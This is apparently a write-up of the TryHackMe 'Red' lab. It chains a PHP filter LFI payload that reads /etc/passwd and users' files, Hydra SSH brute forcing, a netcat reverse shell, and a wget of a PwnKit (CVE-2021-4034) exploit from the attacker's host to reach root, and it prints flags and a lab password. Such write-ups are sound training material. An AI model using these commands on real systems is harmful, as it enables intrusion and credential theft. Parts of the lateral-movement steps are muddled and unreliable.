# 🔴 TryHackMe — Red

> **LFI → Source Code Disclosure → Credential Discovery → Password Cracking → SSH → Lateral Movement → Reverse Shell → pkexec → CVE-2021-4034 → Root**


![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Web-LFI-ff6b35?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Privilege%20Escalation-pkexec-e63946?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/CVE-2021--4034-9b2226?style=flat-square&labelColor=555555)

---

## 📌 Lab Overview

**Red** is a TryHackMe Linux machine that demonstrates a complete attack chain involving:

- Local File Inclusion (LFI)
- PHP filter wrappers
- Source code disclosure
- `/etc/passwd` enumeration
- User credential discovery
- MD5 password cracking
- Password wordlist generation
- SSH access
- Local enumeration
- Lateral movement
- Reverse shell
- `/etc/hosts` manipulation
- Git repository enumeration
- `pkexec` privilege escalation
- CVE-2021-4034
- Root access

The attack chain used in this walkthrough was:

```text
Web Application
      │
      ▼
Local File Inclusion
      │
      ▼
PHP Source Code Disclosure
      │
      ▼
Credential / Hash Discovery
      │
      ▼
Password Cracking
      │
      ▼
SSH → blue
      │
      ▼
Enumerate red user
      │
      ▼
Password reuse / SSH access
      │
      ▼
red user
      │
      ▼
Git Repository
      │
      ▼
pkexec 0.105
      │
      ▼
CVE-2021-4034
      │
      ▼
ROOT
```

---

# 🎯 Objectives

The main objectives of this lab were:

- Identify the vulnerable web application.
- Exploit Local File Inclusion.
- Read PHP source code using php://filter.
- Extract sensitive information from the application.
- Obtain the password hash.
- Crack the discovered password.
- Access the machine through SSH.
- Enumerate the blue user.
- Discover the red user and obtain access.
- Investigate the .git directory.
- Identify the vulnerable pkexec binary.
- Exploit CVE-2021-4034.
- Obtain root access.
- Retrieve the final flag.

---

# 1. 🌐 Accessing the Web Application

The target web application was accessed directly through the browser.

The page contains a parameter named:
```
page
```
Example:
```
http://10.48.173.243/index.php?page=home.html
```
The presence of a file-related page parameter is interesting because it may indicate that the server dynamically loads files based on user-controlled input.

<img width="1134" height="442" alt="1" src="https://github.com/user-attachments/assets/8a20207f-bb35-4480-b49d-88ad9ebd066b" />

---

# 2. 🔎 Identifying Local File Inclusion

The page parameter was tested for Local File Inclusion.

The following PHP filter wrapper was used:
```
php://filter/convert.base64-encode/resource=index.php
```
Example:
```
http://10.48.173.243/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Instead of directly returning the PHP source, the application returned Base64-encoded data.

This is useful because PHP normally executes .php files instead of displaying their source code.

Using:
```
php://filter
```
allows the source to be encoded before being returned.

<img width="1256" height="221" alt="2" src="https://github.com/user-attachments/assets/508a241a-c096-4305-979f-7506b531fab8" />

---

# 3. 🧩 Decoding the PHP Source

The Base64 output was decoded to reveal the application's source code.

The source showed:
```
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];

if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
}
else {
    header('Location: /index.php?page=home.html');
}
```
Important observation

The application attempts to prevent directory traversal by removing:
```
../
./
```
However, the application still allows PHP stream wrappers such as:
```
php://filter
```
Therefore, the filtering mechanism does not properly prevent arbitrary file reads.

<img width="730" height="478" alt="2-2" src="https://github.com/user-attachments/assets/094a3e97-57fe-4595-bc8e-2558e8975f5f" />

---

# 4. 📄 Reading /etc/passwd

The same PHP filter technique was used against:
```
/etc/passwd
```
Payload:
```
php://filter/convert.base64-encode/resource=/etc/passwd
```
The response revealed several local accounts, including:
```
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```
This identified two potentially interesting users:
```
blue
red
```

<img width="1253" height="208" alt="3" src="https://github.com/user-attachments/assets/cbeeeca2-01e0-4c4e-ba36-05a31f5eec26" />

<img width="771" height="574" alt="3-2" src="https://github.com/user-attachments/assets/9d68e296-3baa-40a2-abbc-a236bb5c61ca" />

---

# 5. 🔐 Reading Blue's ```.bash_history```

Since the ```blue``` account was discovered, the next target was:
```
/home/blue/.bash_history
```
The file was accessed through the same LFI technique.

The returned data was Base64 encoded.

The content contained commands previously executed by the blue user.

This is valuable because shell history files can accidentally contain:
```
passwords
usernames
commands
tokens
administrative actions
```

<img width="1249" height="225" alt="4" src="https://github.com/user-attachments/assets/88845bc4-17d0-41e3-8e40-ae4d934026f4" />

---

# 6. 🔓 Decoding the Bash History

The Base64 data was decoded locally.

Example:
```
echo "BASE64_DATA" | base64 --decode
```
The decoded history revealed useful information that could be used to continue the attack.

<img width="1249" height="169" alt="4-2" src="https://github.com/user-attachments/assets/c4525f16-280b-4736-b3e6-c1e920e8f7da" />

---

# 7. 🔍 Inspecting the `.reminder` File

During the enumeration process, the `.reminder` file was identified as an interesting file associated with the `blue` user's home directory.

Instead of assuming its contents directly represented the password, I inspected the file through the LFI vulnerability.

**Request**

```text
http://10.48.173.243/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder
```

<img width="1031" height="143" alt="5" src="https://github.com/user-attachments/assets/796011b4-7722-4af8-b8d2-28270e5d76ff" />

The application returned the contents of ```.reminder``` encoded in Base64.

---

# 8. 🔓 Decode the Base64 Content

The Base64 value returned by the application was decoded locally.
```
echo 'BASE64_VALUE' | base64 --decode
```
The decoded value produced the content that was required for the next step.

The decoded result was then saved into the ```pass``` file for use in the subsequent password attack.

<img width="437" height="92" alt="5-2" src="https://github.com/user-attachments/assets/a9a54110-069c-4b6b-bc83-74944221e096" />

---

# 9. 🔐 Generating Password Candidates

After obtaining the decoded content from `.reminder`, the resulting value was used as the input for generating password candidates.

An initial attempt was made with Hashcat:

```bash
hashcat --stdout pass -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
This produced an error because the required rule file was not available at that path.

A second attempt using the John the Ripper rule set was successful:
```
john --wordlist=pass --rules=best64 --stdout > passlist.txt
```

<img width="717" height="531" alt="6" src="https://github.com/user-attachments/assets/660a8190-3a69-41e3-bbc5-f1ffe481aebf" />

---

# 10. 🔐 Brute Forcing SSH Credentials

Hydra was then used against the SSH service with the generated password list.
```
hydra -l blue -P passlist.txt -t 4 -V 10.48.173.243 ssh
```
Hydra identified valid credentials:
```
login: blue
password: sup3r_p@$$w0rd!123
```
<img width="1243" height="641" alt="7" src="https://github.com/user-attachments/assets/21d724e4-4401-46d4-932e-5b77dc7f6db3" />

# 11. 🚪 SSH Access as Blue

The discovered credentials were used to connect through SSH:
```
ssh blue@10.48.173.243
```
The login was successful.

The current user was verified:
```
id
```
Output:
```
uid=1000(blue) gid=1000(blue) groups=1000(blue)
```

<img width="933" height="726" alt="8" src="https://github.com/user-attachments/assets/6ddaf38c-770b-4846-8239-d2cd72fe484c" />

---

# 12. 🚩 Blue User Flag

The home directory was inspected:
```
ls -la
```
A file named:
```
flag1
```
was found.

The flag was retrieved:
```
cat flag1
THM{is_that_all_y0u_can_d0_blU3?}
```

<img width="549" height="283" alt="9" src="https://github.com/user-attachments/assets/fa63f825-610c-4e37-956c-e948803d9ab0" />

---

# 13. 🔎 Finding the ```Red``` User

The filesystem was searched for another flag:
```
find / -type f -name flag2 2>/dev/null
```
The result showed:
```
/home/red/flag2
```
The file existed inside the ```red``` user's home directory.

<img width="455" height="81" alt="10" src="https://github.com/user-attachments/assets/d877b411-d800-4653-a845-c0773ee779b3" />

---

# 14. 🚫 Access Denied

The ```red``` directory was entered:
```
cd /home/red
```
The flag was visible:
```
ls
```
Output:
```
flag2
```
However:
```
cat flag2
```
returned:
```
Permission denied
```
The directory listing also showed:
```
.git
```
which later became important.

<img width="583" height="320" alt="11" src="https://github.com/user-attachments/assets/bb324911-d4ca-4cba-8908-f348d3778028" />

---

# 15. 🔐 Obtaining Red's Password

The SSH connection was closed, and Hydra was used again with the available password list.
```
hydra -l blue -P passlist.txt -t 4 -V 10.48.173.243 ssh
```
The screenshots show a successful credential discovery for the ```blue``` account.

The subsequent attack path involved the ```red``` user and a reverse shell.

<img width="940" height="722" alt="12" src="https://github.com/user-attachments/assets/a25196ed-3193-497d-80a4-b101ed776811" />

---

# 16. 🔄 Reverse Shell / Red Session

The running processes were inspected.

The process list showed a shell associated with the ```red``` user:
```
red
```
The session provided access to the ```red``` environment.

<img width="1032" height="87" alt="13" src="https://github.com/user-attachments/assets/f11fe303-afbf-49df-b035-2d384fc1d487" />

---

# 17. 🌐 Inspecting ```/etc/hosts```

The ```/etc/hosts``` file was examined:
```
cat /etc/hosts
```
The file contained:
```
127.0.0.1 localhost
127.0.0.1 red
192.168.0.1 redrules.htm
```
The environment allowed modification of ```/etc/hosts```.

<img width="580" height="268" alt="14" src="https://github.com/user-attachments/assets/000c4561-b1c2-41e5-9b65-9d07e3d08219" />


An entry was added:
```
echo "192.168.132.194 redrules.thm" >> /etc/hosts
```
The resulting file showed the added address:
```
192.168.132.194 redrules.thm
```
<img width="496" height="362" alt="15" src="https://github.com/user-attachments/assets/9deaf0f7-52ce-42c5-9cc0-6f3d54123d0e" />

---

# 18. 🚀 Obtaining the ```Red``` User Flag

A reverse shell was established back to the attacking machine.

Listener:
```
nc -lvnp 9001
```
The new shell was running as:
```
red
```
The flag was then accessed:
```
ls
cat flag2
```
The second flag was:
```
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1s}
```

<img width="663" height="242" alt="16" src="https://github.com/user-attachments/assets/5b8f4c69-1e78-489c-89bc-660812fb82f1" />

---

# 19. 📁 Inspecting the ```.git``` Directory

The ```red``` user's home directory contained a ```.git``` directory:
```
ls -la
```
The repository was inspected:
```
cd .git
ls -la
```
A binary named:
```
pkexec
```
was found.

<img width="571" height="442" alt="17" src="https://github.com/user-attachments/assets/1ca65043-1fba-4937-a075-6066b267f74b" />

---

# 20. 🔍 Checking pkexec Version

The discovered binary was checked:
```
/home/red/.git/pkexec --version
```
Output:
```
pkexec version 0.105
```

This version is associated with the well-known **PwnKit** vulnerability:
```
CVE-2021-4034
```

# 21. 📥 Downloading the CVE-2021-4034 Exploit

The exploit was transferred to the target.

A temporary HTTP server was started on the attacking machine:
```
python3 -m http.server
```
<img width="568" height="275" alt="18" src="https://github.com/user-attachments/assets/69190717-091f-4b58-8700-6ce9ab94f7c0" />
<img width="801" height="167" alt="19-1" src="https://github.com/user-attachments/assets/5ae31c43-4826-42a0-86ab-3b71c1f9d45b" />


The target downloaded the exploit:
```
wget 192.168.132.194:8000/CVE-2021-4034.py
```

<img width="678" height="277" alt="19-2" src="https://github.com/user-attachments/assets/e2d6d460-2825-4258-ac9f-08fc8747f452" />

The file was successfully downloaded:
```
CVE-2021-4034.py
```

---

# 22. 💥 Exploiting CVE-2021-4034

The exploit was executed:
```
python3 CVE-2021-4034.py
```
The exploit executed:
```
whoami
```
and returned:
```
root
```
This confirmed successful privilege escalation.

<img width="344" height="76" alt="20" src="https://github.com/user-attachments/assets/f306230b-d9bf-4763-b0d9-00841cf65f8b" />

---

# 23. 👑 Root Flag

After obtaining root access:
```
cd /root
ls
```
The root directory contained:
```
flag3
```
The final flag was retrieved:
```
cat flag3
```
Final flag:
```
THM{G0oD_Gam3_BlU3_GG}
```
<img width="304" height="120" alt="21" src="https://github.com/user-attachments/assets/f6ff273a-6b6b-4e28-90f8-420e5e817d7f" />
